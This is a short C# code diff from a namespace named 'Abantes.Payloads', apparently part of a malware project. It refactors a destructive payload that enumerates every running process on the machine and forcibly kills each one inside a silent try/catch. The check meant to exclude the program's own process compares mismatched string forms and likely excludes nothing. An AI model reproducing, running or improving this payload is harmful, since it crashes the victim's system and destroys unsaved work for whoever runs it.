@@ -187,13 +187,13 @@ namespace Abantes.Payloads
 
             Process[] allProcesses = Process.GetProcesses();
 
-            for (int i = 0; i < allProcesses.Length; i++)
+            foreach (Process proc in allProcesses)
             {
-                if (allProcesses[i].ToString() != Process.GetProcessesByName("Abantes").ToString() || allProcesses[i].ToString() != Process.GetProcessesByName("Abantes").ToString())
+                if (proc.ToString() != Process.GetProcessesByName("Abantes").ToString())
                 {
                     try
                     {
-                        allProcesses[i].Kill();
+                        proc.Kill();
                     } catch { }
                 }
             }
